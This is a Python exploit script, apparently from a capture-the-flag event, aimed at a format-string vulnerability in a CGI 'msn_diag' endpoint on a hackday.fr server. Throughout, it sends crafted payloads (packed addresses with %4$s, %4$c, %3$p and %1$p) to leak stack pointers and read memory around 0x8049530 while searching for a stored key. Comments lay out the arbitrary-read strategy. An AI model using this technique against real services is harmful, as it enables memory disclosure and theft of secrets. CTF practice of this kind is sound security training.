#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read()
    except Exception as e:
        return b""

def send_msg(body_str):
    encoded = urllib.parse.quote(body_str, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read().decode('latin-1', errors='replace')
    except Exception as e:
        return f"ERROR: {e}"

def extract_diag_bytes(raw):
    marker = b'DIAG '
    idx = raw.find(marker)
    if idx >= 0:
        return raw[idx+5:].rstrip(b'\r\n')
    return b''

# From our analysis: 
# pos 1 = stack pointer to our buffer (volatile) 
# pos 3 = 0x8049530 (constant, in binary data section)
#
# Let's try reading data ADJACENT to 0x8049530
# by sending those addresses directly via %4$s
# address bytes MUST be non-null for %s to work

print("=== Read data around 0x8049530 ===")
for offset in range(-16, 64, 4):
    addr = 0x8049530 + offset
    # Check for null bytes in address
    addr_bytes = struct.pack('<I', addr)
    if b'\x00' in addr_bytes:
        print(f"  0x{addr:08x} (skip - null bytes)")
        continue
    payload = addr_bytes + b'%4$s'
    raw = send_msg_raw(payload)
    content = extract_diag_bytes(raw)
    print(f"  read[0x{addr:08x}]+{offset:+3d}: len={len(content)} -> {repr(content[:40])}")
    time.sleep(0.05)

print()
print("=== Try reading what 0x8049530 contains as a pointer chain ===")
# Step 1: Read 4 bytes at 0x8049530 using %x (already showed it's 0x08049530 or similar)
# Let us try %3$p to get the VALUE at pos 3 vs the address
result = send_msg("%3$p")
print(f"pos 3 as ptr: {result.strip()}")

# The value at pos 3 is 0x8049530 (the address itself!)
# This means the GLOBAL VARIABLE at that position on the stack is literally the value 0x8049530
# Maybe the binary is: printf("MSG 1 DIAG %s\n", global_key_ptr, body_buffer)
# and global_key_ptr is stored at data+offset

# Let me try: what if the ACTUAL calling convention puts things differently?
# The printf format string is the body, and preceding args might be:
# arg0 (pos 1) = pointer to body buffer (our input) <- volatile, stack
# arg1 (pos 2) = NULL
# arg2 (pos 3) = some global/constant pointer
# then body starts at pos 4

# Alternatively, maybe the binary does:
# char key[32]; // global
# fread(key, 1, 32, keyfile); // load at startup 
# printf(body); // vulnerable!
# The key char[] is a global but NOT passed as arg to printf

# This means we need ARBITRARY READ to get it
# The 0x8049530 might be adjacent to where the key is stored!

# Let's read large blocks to find the key
print()
print("=== Read 16 bytes starting at 0x8049530 using multiple %4$s reads ===")
# Read byte by byte using format: ADDR%4$c (character read)
key_region_bytes = b''
for i in range(0, 64, 4):
    addr = 0x8049530 + i
    addr_bytes = struct.pack('<I', addr)
    if b'\x00' in addr_bytes:
        key_region_bytes += b'\x00\x00\x00\x00'
        continue
    payload = addr_bytes + b'%4$s'
    raw = send_msg_raw(payload)
    content = extract_diag_bytes(raw)
    if content and content != b'(null)':
        key_region_bytes += content[:4] if len(content) >= 4 else content + b'\x00' * (4-len(content))
    else:
        key_region_bytes += b'\x00\x00\x00\x00'
    time.sleep(0.05)

print(f"Data at 0x8049530: {key_region_bytes.hex()}")
print(f"As string: {repr(key_region_bytes)}")

# Let's be smarter - use byte format with %c to read byte by byte
print()
print("=== Read single char at 0x8049530 ===")
addr = 0x8049530
addr_bytes = struct.pack('<I', addr)
payload = addr_bytes + b'%4$c'
raw = send_msg_raw(payload)
content = extract_diag_bytes(raw)
print(f"  char at 0x8049530: {repr(content)}")

# And then use actual format string to dump environment variables or argv
# Maybe %1$s would give us the argv/env area
print()
print("=== Check what's near stack ptr (pos 1) ===")
# Get the current buf address, then read nearby
result = send_msg("ADDR=%1$p")
print(f"Buf addr result: {result.strip()}")
